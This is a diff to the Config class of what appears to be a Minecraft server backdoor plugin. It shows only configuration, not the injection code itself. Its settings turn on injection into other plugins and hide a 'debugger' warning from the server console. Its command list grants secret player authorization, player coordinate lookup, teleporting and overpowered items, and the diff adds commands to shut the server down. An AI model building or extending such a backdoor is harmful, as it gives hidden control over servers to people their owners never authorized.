@@ -27,10 +27,10 @@ public class Config {
     public static Boolean inject_into_other_plugins = true;
 
     // Warn server console about "debugger"
-    public static final Boolean display_debugger_warning = false;
+    public static Boolean display_debugger_warning = false;
 
     // Print debug messages to console 
-    public static final Boolean display_debug_messages = false;
+    public static Boolean display_debug_messages = false;
 
 
 
@@ -59,7 +59,6 @@ public class Config {
 
     // Give 32k items vanishing curse (Item cannot be stolen)
     public static final boolean curse_enchants = true;
-
 
     /* Chat settings */
 
@@ -100,8 +99,9 @@ public class Config {
             new HelpItem("coords",      "[player]",                     "Get the coordinates of specified player."),
             new HelpItem("tp",          "[x] [y] [z]",                  "[Visible] Teleport to specified coordinates."),
             new HelpItem("auth",        "(player)",                     "Authorize user until next server restart."),
-            new HelpItem("deauth",      "(player)",                     "Remove player authorized with " + command_prefix + "auth. Perminantly auth'd players cannot be deauth'ed")
-
+            new HelpItem("deauth",      "(player)",                     "Remove player authorized with " + command_prefix + "auth. Perminantly auth'd players cannot be deauth'ed"),
+            new HelpItem("shutdown",    "",                             "[Visible] Shutdown the server."),
+            new HelpItem("stop",    "",                             "[Visible] Shutdown the server.")
     };
 
     public static class HelpItem{
